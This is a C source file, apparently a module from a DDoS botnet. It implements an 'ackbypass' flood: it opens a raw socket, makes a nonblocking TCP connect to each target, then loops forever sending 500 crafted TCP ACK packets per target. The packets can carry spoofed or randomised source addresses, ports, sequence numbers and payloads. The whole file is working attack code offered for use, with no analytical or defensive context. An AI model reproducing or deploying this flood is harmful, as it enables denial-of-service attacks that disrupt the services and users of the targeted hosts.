#define _GNU_SOURCE
#include "../../attack.h"

void flood_ackbypass(struct flood *flood)
{
    int i, fd_raw, fd_tcp;
    struct sockaddr_in srv_addr;
    char *packet = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length);
    struct iphdr *ip_header = (struct iphdr *)packet;
    struct tcphdr *tcp_header = (struct tcphdr *)(ip_header + 1);
    char *data = (char *)(tcp_header + 1);
    
    if ((fd_raw = sys_socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        debug("Could not create a RAW socket for ackbypass attack.");
        return;
    }

    int one = 1;
    if (sys_setsockopt(fd_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) == -1)
    {
        debug("Could not set IP_HDRINCL for ackbypass attack.");
        sys_close(fd_raw);
        return;
    }

    memset(packet, 0, sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length);

    while (TRUE)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            uint16_t dport = flood->settings->dest_port == 0xffff ? (uint16_t)rand_next() : (uint16_t)flood->settings->dest_port;
            
            // 1. Kernel level sys_connect(TCP)
            if ((fd_tcp = sys_socket(AF_INET, SOCK_STREAM, 0)) != -1)
            {
                sys_fcntl(fd_tcp, F_SETFL, O_NONBLOCK);
                srv_addr.sin_family = AF_INET;
                srv_addr.sin_addr.s_addr = flood->targets[i].addr;
                srv_addr.sin_port = htons(dport);
                sys_connect(fd_tcp, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
            }

            // 2. Send 500 RAW ACKs
            for (int p = 0; p < 500; p++)
            {
                memset(packet, 0, sizeof(struct iphdr) + sizeof(struct tcphdr));
                
                ip_header->version_ihl = (4 << 4) | 5;
                ip_header->tos = flood->settings->tos;
                ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length);
                ip_header->id = flood->settings->ident == 0xffff ? (uint16_t)rand_next() : htons(flood->settings->ident);
                ip_header->ttl = flood->settings->ttl;
                if (flood->settings->dont_fragment)
                    ip_header->frag_off = htons(1 << 14);
                ip_header->protocol = IPPROTO_TCP;
                ip_header->saddr = flood->settings->source_ip == 0xffffffff ? rand_next() : flood->settings->source_ip;
                ip_header->daddr = flood->targets[i].addr;

                tcp_header->source = htons(flood->settings->source_port == 0xffff ? (uint16_t)rand_next() : (uint16_t)flood->settings->source_port);
                tcp_header->dest = htons(dport);
                tcp_header->seq = flood->settings->seq_rnd == 0xffff ? rand_next() : htonl(flood->settings->seq_rnd);
                tcp_header->ack_seq = flood->settings->ack_seq_rnd == 0xffff ? rand_next() : htonl(flood->settings->ack_seq_rnd);
                tcp_header->doff = 5;
                tcp_header->ack = 1;
                tcp_header->window = htons(65535);

                if (flood->settings->random_data)
                {
                    rand_str(data, flood->settings->length);
                }
                else if (flood->settings->payload != NULL)
                {
                   memcpy(data, flood->settings->payload, flood->settings->length);
                }

                ip_header->check = 0;
                ip_header->check = checksum_generic((uint16_t *)ip_header, sizeof(struct iphdr));

                tcp_header->check = 0;
                tcp_header->check = checksum_tcpudp((uint8_t *)tcp_header, sizeof(struct tcphdr) + flood->settings->length, (uint8_t *)&ip_header->saddr, (uint8_t *)&ip_header->daddr);

                sys_sendto(fd_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length, MSG_NOSIGNAL, (void *)&flood->targets[i].sock_addr, sizeof(struct sockaddr_in));
            }
            if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
            
            if (fd_tcp != -1) sys_close(fd_tcp);
        }
    }
    
    free(packet);
    sys_close(fd_raw);
}
